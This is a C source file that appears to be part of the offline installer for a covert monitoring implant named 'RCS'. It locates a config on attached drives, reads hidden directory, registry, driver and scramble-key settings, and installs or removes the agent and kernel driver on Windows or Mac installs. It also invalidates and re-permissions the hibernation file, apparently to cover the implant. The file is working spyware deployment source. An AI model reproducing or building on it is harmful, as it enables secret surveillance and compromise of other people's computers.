#include "stdafx.h"
#include "Functions_Users.h"
#include "Functions_RCS_WIN.h"
#include "Functions_RCS_MAC.h"
#include "DumpFiles.h"
#include "commons.h"

BOOL GetSourceFileDirectory(users_struct_t *curr_user, os_struct_t *curr_elem, rcs_struct_t *rcs_info, WCHAR *src_path)
{
	if (curr_elem->os == WIN_OS) {
		WIN_GetSourceFileDirectory(curr_user, rcs_info, src_path);
		return TRUE;
	} else if (curr_elem->os == MAC_OS) {
		MAC_GetSourceFileDirectory(curr_user, rcs_info, curr_elem, src_path);
		return TRUE;
	} else 
		return FALSE; // UNKNOWN
}

BOOL ReadRCSInfo(rcs_struct_t *rcs_info)
{
	WCHAR drive_list[512];
	WCHAR mask_string[4096];
	WCHAR scramble_byte[16]; 
	DWORD drive_len, i;
	HANDLE hfile;
	
	if(!(drive_len = GetLogicalDriveStrings(sizeof(drive_list) / sizeof(drive_list[0]), drive_list)))
		return FALSE;

	rcs_info->rcs_files_path[0] = L'\0';

	for(i = 0; i < drive_len; i += 4) {
		swprintf_s(rcs_info->rcs_ini_path, MAX_PATH, L"%s%s", &drive_list[i], L"RCSPE\\rcs.ini");
		hfile = CreateFile(rcs_info->rcs_ini_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		if (hfile != INVALID_HANDLE_VALUE) {
			CloseHandle(hfile);
			swprintf_s(rcs_info->rcs_files_path, MAX_PATH, L"%s%s", &drive_list[i], L"RCSPE\\files\\");
			break;
		}
	}

	if(rcs_info->rcs_files_path[0] == L'\0') {
		return FALSE;
	}

	if(!GetPrivateProfileString(L"RCS", L"VERSION", L"", rcs_info->version, sizeof(rcs_info->version)/sizeof(rcs_info->version[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}
	if(!GetPrivateProfileString(L"RCS", L"HDIR", L"", rcs_info->new_hdir, sizeof(rcs_info->new_hdir)/sizeof(rcs_info->new_hdir[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}
	if(!GetPrivateProfileString(L"RCS", L"HREG", L"", rcs_info->hreg, sizeof(rcs_info->hreg)/sizeof(rcs_info->hreg[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}
	if(!GetPrivateProfileString(L"RCS", L"HCORE", L"", rcs_info->hcore, sizeof(rcs_info->hcore)/sizeof(rcs_info->hcore[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}
	if(!GetPrivateProfileString(L"RCS", L"HDRV", L"", rcs_info->hdrv, sizeof(rcs_info->hdrv)/sizeof(rcs_info->hdrv[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}
	if(!GetPrivateProfileString(L"RCS", L"DRIVER64", L"", rcs_info->hdrv64, sizeof(rcs_info->hdrv64)/sizeof(rcs_info->hdrv64[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}
	if(!GetPrivateProfileString(L"RCS", L"HSYS", L"", rcs_info->hsys, sizeof(rcs_info->hsys)/sizeof(rcs_info->hsys[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}
	if(!GetPrivateProfileString(L"RCS", L"HKEY", L"", scramble_byte, sizeof(scramble_byte)/sizeof(scramble_byte[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}
	swscanf_s(scramble_byte, L"%X", &(rcs_info->hscramb));

	if(!GetPrivateProfileString(L"RCS", L"HUID", L"", rcs_info->rcs_name, sizeof(rcs_info->rcs_name)/sizeof(rcs_info->rcs_name[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}

	if(!GetPrivateProfileString(L"RCS", L"FUNC", L"", rcs_info->func_name, sizeof(rcs_info->func_name)/sizeof(rcs_info->func_name[0]), rcs_info->rcs_ini_path)) {
		return FALSE;
	}

	if(!GetPrivateProfileString(L"RCS", L"MASK", L"", mask_string, sizeof(mask_string)/sizeof(mask_string[0]), rcs_info->rcs_ini_path)) 
		rcs_info->masks = NULL;
	else
		rcs_info->masks = PopulateMasks(mask_string);

	if(!GetPrivateProfileString(L"RCS", L"HOLDDIR", L"", rcs_info->hdir, sizeof(rcs_info->hdir)/sizeof(rcs_info->hdir[0]), rcs_info->rcs_ini_path)) 
		memcpy(rcs_info->hdir, rcs_info->new_hdir, sizeof(rcs_info->hdir));

	if(!GetPrivateProfileString(L"RCS", L"HOLDREG", L"", rcs_info->old_hreg, sizeof(rcs_info->old_hreg)/sizeof(rcs_info->old_hreg[0]), rcs_info->rcs_ini_path)) 
		memcpy(rcs_info->old_hreg, rcs_info->hreg, sizeof(rcs_info->old_hreg));

	return TRUE;
}

BOOL RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	if (os_info->os == WIN_OS)
		return WIN_RCSInstall(rcs_info, user_info, os_info);
	else if (os_info->os == MAC_OS)
		return MAC_RCSInstall(rcs_info, user_info, os_info);
	else
		return NULL;
}

BOOL RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	if (os_info->os == WIN_OS)
		return WIN_RCSUnInstall(rcs_info, user_info, os_info);
	else if (os_info->os == MAC_OS)
		return MAC_RCSUnInstall(rcs_info, user_info, os_info);
	else
		return NULL;
}

BOOL DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *user_list)
{
	if (os_info->os == WIN_OS)
		return WIN_DriverInstall(os_info, rcs_info, user_list);
	else if (os_info->os == MAC_OS)
		return MAC_DriverInstall(os_info, rcs_info, user_list);
	else
		return NULL;
}

BOOL DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *user_list, DWORD installation_count)
{
	if (os_info->os == WIN_OS)
		return WIN_DriverUnInstall(os_info, rcs_info, user_list, installation_count);
	else if (os_info->os == MAC_OS)
		return MAC_DriverUnInstall(os_info, rcs_info, user_list, installation_count);
	else
		return NULL;
}

BOOL IsHybernated(os_struct_t *os_info)
{
	HANDLE hfile;
	WCHAR hyb_path[MAX_PATH];
	BYTE buff[4];
	DWORD dummy;
	
	swprintf_s(hyb_path, sizeof(hyb_path)/sizeof(hyb_path[0]), L"%shiberfil.sys", os_info->drive);
	hfile = CreateFile(hyb_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) 
		return FALSE;

	if (!ReadFile(hfile, buff, 4, &dummy, NULL)) {
		CloseHandle(hfile);
		return FALSE;
	}

	CloseHandle(hfile);

	if (!memcmp(buff, "HIBR", 4) || !memcmp(buff, "hibr", 4) || !memcmp(buff, "WAKE", 4) || !memcmp(buff, "wake", 4))
		return TRUE;

	return FALSE;
}

void InvalidateHybernated(os_struct_t *os_info)
{
	HANDLE hfile;
	WCHAR hyb_path[MAX_PATH];
	BYTE buff[4];
	DWORD dummy;

	swprintf_s(hyb_path, sizeof(hyb_path)/sizeof(hyb_path[0]), L"%shiberfil.sys", os_info->drive);
	hfile = CreateFile(hyb_path, GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return;

	ZeroMemory(buff, 4);
	WriteFile(hfile, buff, 4, &dummy, NULL);
	CloseHandle(hfile);
}

void RestoreHybernationPermissions(os_struct_t *os_info)
{
	WCHAR hyb_path[MAX_PATH];
	
	swprintf_s(hyb_path, sizeof(hyb_path)/sizeof(hyb_path[0]), L"%shiberfil.sys", os_info->drive);
	SetFileAttributes(hyb_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
}

void ModifyHybernationPermissions(os_struct_t *os_info)
{
	WCHAR hyb_path[MAX_PATH];
	
	swprintf_s(hyb_path, sizeof(hyb_path)/sizeof(hyb_path[0]), L"%shiberfil.sys", os_info->drive);
	SetFileAttributes(hyb_path, FILE_ATTRIBUTE_NORMAL);
	AddAceToObjectsSecurityDescriptor(hyb_path, SE_FILE_OBJECT, L"System", TRUSTEE_IS_NAME, STANDARD_RIGHTS_ALL, GRANT_ACCESS, CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE); 
}
